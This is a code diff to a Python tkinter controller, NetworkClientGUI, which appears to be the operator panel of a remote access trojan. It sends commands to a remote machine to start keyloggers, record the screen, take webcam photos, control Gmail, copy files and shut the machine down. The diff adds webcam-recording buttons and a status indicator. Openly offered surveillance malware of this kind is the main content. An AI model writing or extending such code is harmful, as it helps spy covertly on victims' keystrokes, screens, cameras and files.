@@ -40,9 +40,13 @@ class NetworkClientGUI:
 
         self.keylogger_status = tk.StringVar(value="Keylogger: ❌ Off")
         self.recording_status = tk.StringVar(value="Recording: ❌ Off")
+        self.webcam_status = tk.StringVar(value="Webcam: ❌ Off")
+
 
         tk.Label(status_frame, textvariable=self.keylogger_status, fg="blue", font=("Arial", 10, "bold")).pack(side=tk.LEFT, padx=20)
         tk.Label(status_frame, textvariable=self.recording_status, fg="green", font=("Arial", 10, "bold")).pack(side=tk.LEFT, padx=20)
+        tk.Label(status_frame, textvariable=self.webcam_status, fg="purple", font=("Arial", 10, "bold")).pack(side=tk.LEFT, padx=20)
+
 
     def create_buttons(self):
         button_groups = [
@@ -52,8 +56,10 @@ class NetworkClientGUI:
                 ("list_apps", lambda: self.send_predefined("list_apps")),
                 ("screenshot", lambda: self.send_predefined("screenshot")),
                 ("webcam_photo", lambda: self.send_predefined("webcam_photo")),
+                ("restart", lambda: self.send_predefined("restart")),
             ],
             [
+                ("shutdown", lambda: self.send_predefined("shutdown")),
                 ("start_keylogger", self.send_start_keylogger),
                 ("stop_keylogger", self.send_stop_keylogger),
                 ("start_record", self.send_start_record),
@@ -61,8 +67,8 @@ class NetworkClientGUI:
                 ("gmail_control", lambda: self.send_predefined("gmail_control")),
             ],
             [
-                ("restart", lambda: self.send_predefined("restart")),
-                ("shutdown", lambda: self.send_predefined("shutdown")),
+                ("start_webcam_record", lambda: self.send_predefined("start_webcam_record")),
+                ("stop_webcam_record", lambda: self.send_predefined("stop_webcam_record")),
                 ("start <name>", self.send_start),
                 ("stop <name>", self.send_stop),
                 ("copyfile <path>", self.send_copyfile),
@@ -180,12 +186,19 @@ class NetworkClientGUI:
                 response = data.decode()
                 self.output_box.insert(tk.END, f"{response}\n")
                 self.output_box.see(tk.END)
+                # Update webcam status if applicable
+                if "Webcam recording started" in response:
+                    self.webcam_status.set("Webcam: 🔴 Recording")
+                elif "Webcam recording stopped" in response:
+                    self.webcam_status.set("Webcam: ❌ Off")
+
                 
                 # Check if server is sending a file
                 last_command = getattr(self, 'last_command', '')
                 if (("Screenshot captured successfully" in response and last_command == "screenshot") or
                     ("Screen recording stopped" in response and last_command == "stop_record") or
                     ("Webcam photo captured successfully" in response and last_command == "webcam_photo") or
+                    ("Webcam recording stopped" in response and last_command == "stop_webcam_record") or
                     ("Keylogger stopped" in response and last_command == "stop_keylogger") or
                     ("File copied successfully" in response and last_command.startswith("copyfile")) or
                     ("process_list.txt" in response and last_command == "list_services") or
